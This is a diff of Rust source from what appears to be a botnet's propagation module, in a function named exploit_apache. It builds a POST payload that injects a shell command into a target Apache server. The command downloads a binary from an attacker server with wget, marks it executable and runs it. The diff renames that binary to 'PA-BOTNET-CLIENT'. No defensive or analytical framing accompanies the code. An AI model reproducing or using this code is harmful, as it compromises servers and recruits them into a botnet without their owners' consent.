@@ -41,7 +41,7 @@ pub(crate) async fn exploit_apache(target_ip: &str, srv: &str, port: &str) {
                 .arg("POST")
                 .arg("-d")
                 .arg(format!(
-                    "echo; cd /tmp && wget http://{}:{}/api/foo_shi_shi_bang && chmod +x foo_shi_shi_bang && ./foo_shi_shi_bang",
+                    "echo; cd /tmp && wget http://{}:{}/api/PA-BOTNET-CLIENT && chmod +x PA-BOTNET-CLIENT && ./PA-BOTNET-CLIENT",
                     srv,
                     port
                 )) //ajouter ./...
